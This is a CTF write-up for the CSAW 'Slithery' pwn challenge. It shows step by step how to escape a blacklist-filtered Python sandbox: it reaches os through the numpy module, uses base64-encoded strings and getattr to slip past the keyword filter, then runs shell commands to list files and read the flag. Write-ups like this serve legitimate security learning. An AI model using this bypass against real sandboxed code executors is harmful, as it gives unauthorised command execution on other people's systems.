# Slithery

## Problem description

Setting up a new coding environment for my data science students. Some of them
are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you
help test this before I use it for my class? Two sandboxes should be better
than one...

```nc pwn.chal.csaw.io 5011```

[sandbox.py](https://ctf.csaw.io/files/f273beef210bb77ed37ab74d82cb9799/sandbox.py?token=eyJ1c2VyX2lkIjo1MzYzLCJ0ZWFtX2lkIjo1MzI3LCJmaWxlX2lkIjo3NDMwfQ.X14Svg.zXKY8HMMgjM64swHwOaCZeUN5aE)

Category: pwn. Points: 100.

### sandbox.py
```
#!/usr/bin/env python3
from base64 import b64decode
import blacklist  # you don't get to see this :p

"""
Don't worry, if you break out of this one, we have another one underneath so that you won't
wreak any havoc!
"""

def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]):
                raise Exception("not allowed!!")

            final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)

        except (KeyboardInterrupt, EOFError):
            return 0
        except Exception as e:
            print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```

## Personal note
First time solving a pwn challenge. It was fun to do a python RCE challenge,
and I also learned some new things about the python language.

## Tools
* python3 interpreter

## Solving the challenge
This is a coding environment that accepts python commands. However, there is
a blacklist, meaning a lot of our input will not be accepted. We need to get
around the blacklist to execute the commands that will let us read the flag.

This would be the naive approach (without the blacklist):
```
>>> import os
>>> # List files in current directory, hopefully the flag is there
>>> os.system("ls")
>>> # Assuming the flag is located in flag.txt
>>> os.system("cat flag.txt") # Output file content
```

Connecting via netcat: `nc pwn.chal.csaw.io 5011`

```
EduPy 3.8.2
>>> import os
Exception: not allowed!!
>>> import
Exception: not allowed!!
>>> os
Exception: not allowed!!
>>> system
Exception: not allowed!!
```

Thus, we can not import modules the traditional way, and the os keyword is blacklisted.
So we need to find another way to get the flag. Examining sandbox.py gives
us some hints. We have access to the script variables from the coding environment,
but the easiest way to examine how the code works (without being bothered by
the blacklist) is to paste it into our own python3 interpreter:

```
>>> uOaoBPLLRN = open("sandbox.py", "r")
>>> uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
>>> ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
>>> AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
>>> bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
>>> uOaoBPLLRN.close()
>>> HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
>>> RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))

# Examining variables
>>> print(AAnBLJqtRv)
base64
>>> print(bAfGdqzzpg)
b64decode
>>> print(HrjYMvtxwA)
<function b64decode at 0x7f2dfcadf2f0>
>>> print(RMbPOQHCzt)
<module 'numpy' from PATH+'/__init__.py'>
```

Now we know we can b64decode strings using the HrjYMvtxwA variable. This could
be a way to circumvent the blacklist. We also have access to the numpy module.

We can examine the numpy module further in our own python3 interpreter:
```
>>> print(RMbPOQHCzt.__dict__)
```

This module has a lot of attributes. For instance, I noticed that the sys
module is exposed through the numpy module.
```
>>> print(RMbPOQHCzt.sys)
<module 'sys' (built-in)>
```

So let's see if the os module is also exposed:
```
>>> print(RMbPOQHCzt.os)
<module 'os' from PATH+'os.py'>
```

This looks really promising. However, we still have the problem that we can not access
the os property directly from the coding environment, since the word "os" is blacklisted. To get around this restriction, we can first b64encode the word, and then b64decode it.
The problem then is that we will only have access to the word "os" as a string.
It is not possible to call a method using a string when using dot notation.

```
>>> print(RMbPOQHCzt."os")
  File "<stdin>", line 1
    >>> print(RMbPOQHCzt."os")
     ^
SyntaxError: invalid syntax
```

Actually, sandbox.py uses an alternative approach:
```
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
```

Let's find out more:
```
>>> help(getattr)

Help on built-in function getattr in module builtins:

getattr(...)
    getattr(object, name[, default]) -> value

    Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y.
```

Using `getattr`, it should be possible to access the os attribute through a string.

Let's craft our solution in our own interpreter before trying it in the coding environment:
```
>>> base64.b64encode(b'os')
b'b3M='
>>> base64.b64encode(b'system')
b'c3lzdGVt'
>>> o = getattr(RMbPOQHCzt, HrjYMvtxwA(b'b3M=').decode('utf-8'))
>>> getattr(o, HrjYMvtxwA(b'c3lzdGVt').decode('utf-8'))("ls") # Equivalent to os.system("ls")
>>> getattr(o, HrjYMvtxwA(b'c3lzdGVt').decode('utf-8'))("cat flag.txt") # Assuming flag is in flag.txt

```

Connecting to the coding environment:
```
$ nc pwn.chal.csaw.io 5011
EduPy 3.8.2
>>> o = getattr(RMbPOQHCzt, HrjYMvtxwA(b'b3M=').decode('utf-8'))
>>> getattr(o, HrjYMvtxwA(b'c3lzdGVt').decode('utf-8'))("ls")                      
blacklist.py
flag.txt
runner.py
sandbox.py
solver.py
>>>
>>> getattr(o, HrjYMvtxwA(b'c3lzdGVt').decode('utf-8'))("cat flag.txt")
flag{y4_sl1th3r3d_0ut}
```

Finally, we obtain the flag: \
`flag{y4_sl1th3r3d_0ut}`
